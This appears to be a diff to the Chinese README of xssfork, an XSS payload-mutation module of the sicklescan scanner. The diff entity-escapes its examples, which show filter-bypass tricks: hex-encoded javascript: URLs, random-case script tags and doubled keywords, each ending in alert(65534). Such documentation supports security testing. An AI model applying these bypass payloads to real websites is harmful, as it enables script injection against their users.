@@ -26,7 +26,7 @@ xssfork作为sicklescan的一个功能模块，其开发主要目的是用于检
 ### 10hex_encode
 将html标签内部字符10进制化
 ```
-<a href=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x36&#x35&#x35&#x33&#x34&#x29&#x3b>aaa</a>
+&lt;a href=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x36&#x35&#x35&#x33&#x34&#x29&#x3b&gt;aaa&lt;/a&gt;
 ```
 ![](http://ohsqlm7gj.bkt.clouddn.com/17-7-24/19641734.jpg)
 其效果如下
@@ -38,27 +38,27 @@ xssfork作为sicklescan的一个功能模块，其开发主要目的是用于检
 随机大小写
 将
 ```
-<script>alert(65534);</script>
+&lt;script&gt;alert(65534);&lt;/script&gt;
 ```
 转换成
 ```
-<ScRIPt>alert(65534);</ScRIpT>
+&lt;ScRIPt&gt;alert(65534);&lt;/ScRIpT&gt;
 ```
 ### addkeywords
 主要是应对过滤为replace('keywords','')的情况  
 ```
-<script>alert(65534);</script>
+&lt;script&gt;alert(65534);&lt;/script&gt;
 ```变成
 ```
-<<script>script>alert(65534);</script>
+&lt;&lt;script&gt;script&gt;alert(65534);&lt;/script&gt;
 ```
 当然默认开启的是轻量模式，即只返回一个payload，开启重量模式，可以生成更加丰富的pyaload，效果如下
 ```
-<script>alert(65534);</script>  
-<script>alert(65534);</ScrIpt>  
-<ScrIpt>alert(65534);</sCrIpt>  
-<scRiPt>alert(65534);</script>  
-<ScrIpt>alert(65534);</script>
+&lt;script&gt;alert(65534);&lt;/script&gt;
+&lt;script&gt;alert(65534);&lt;/ScrIpt&gt;
+&lt;ScrIpt&gt;alert(65534);&lt;/sCrIpt&gt; 
+&lt;scRiPt&gt;alert(65534);&lt;/script&gt; 
+&lt;ScrIpt&gt;alert(65534);&lt;/script&gt;
 ```
 ## 演示
 ![](http://ohsqlm7gj.bkt.clouddn.com/2017-07-24%20at%20%E4%B8%8B%E5%8D%884.23.gif)
